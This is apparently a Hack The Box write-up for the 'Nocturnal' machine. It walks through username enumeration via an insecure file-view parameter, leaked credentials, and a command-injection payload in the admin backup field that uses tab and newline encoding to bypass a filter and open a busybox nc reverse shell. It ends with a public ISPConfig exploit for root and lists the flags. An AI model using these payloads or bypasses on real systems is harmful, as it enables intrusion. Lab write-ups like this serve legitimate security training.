```json
Alias: Nocturnal
Date: 16-04_2025
Platform: Hackthebox
OS: Linux
Difficulty: Easy
Status: Complete
IP: 10.10.11.64
```

# Nocturnal
# Summary

- Placeholder

# Used Tools

* Placeholder
 
---

# Information Gathering
## NMAP
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-16 17:48 PKT
Nmap scan report for 10.10.11.64
Host is up (0.13s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.93 seconds
```
## Discovered Subdomains
```
nocturnal.htb
```

---
# Enumeration

Upon logging in, we can immediately see a file upload functionality. After uploading a file, the site provides a link to retrieve the file, which looks like:

```
http://nocturnal.htb/view.php?file=test.odt&username=0xfa11
```

And if we, change the username to someone else's like admin and try to retrieve a file that doesn't exist, it will show all the files that the user has uploaded. So we can perform username enumeration and see if anyone has uploaded sensitive files.

```bash
ffuf -u http://nocturnal.htb/view.php\?file\=.odt\&username\=FUZZ -w ~/Documents/Wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -b "PHPSESSID=s0hbldumq0kcidebecb0mmcaih" -fs 2985
```

We can find a file name `privacy.odt` from the user Amanda which contains a password for

```
http://nocturnal.htb/admin.php
```

| Username | Password         |
| -------- | ---------------- |
| Amanda   | arHkG7HAI68X8s1J |

After logging in as Amanda, we can see all the PHP files for the website, The interesting bit is in `admin.php` which has a command injection in the backup functionality. The injection can be done through the password field as the input sanitized properly.


---

# Exploitation


Use the following payload in the password field through burp to get command execution:

```bash
%0abusybox%09nc%0910.10.14.76%094444%09-e%09sh%09%23
```

The sanitation function blacklists spaces and a bunch of other chars, but we can still use `%09` tabs instead of spaces and `%0a` newlines instead of `; & &&` etc

With this we should get a shell of `www-data`


---

# Lateral Movement

`/var/www/nocturnal_database/nocturnal_database.db` contains some hashes. Cracking the hash for Tobias gives us

| Username | Password             |
| -------- | -------------------- |
| Tobias   | slowmotionapocalypse |

We can now ssh to tobias

---

# Privilege Escalation

ISPConfig is running at port 8080, use chisel to access the port and login with the credentials

| Username | Password             |
| -------- | -------------------- |
| admin    | slowmotionapocalypse |
The version of ISPConfig running is vulnerable to : https://github.com/ajdumanhug/CVE-2023-46818/blob/main/CVE-2023-46818.py

```bash
python3 ispconfigexp.py http://127.0.0.1:8081 admin slowmotionapocalypse
```

And we're root

---

# Flags
- fb4e806e98261e36892a97f1f5b41fecs
- 3c536b8443e949c4daed3de820ccc606

#CTF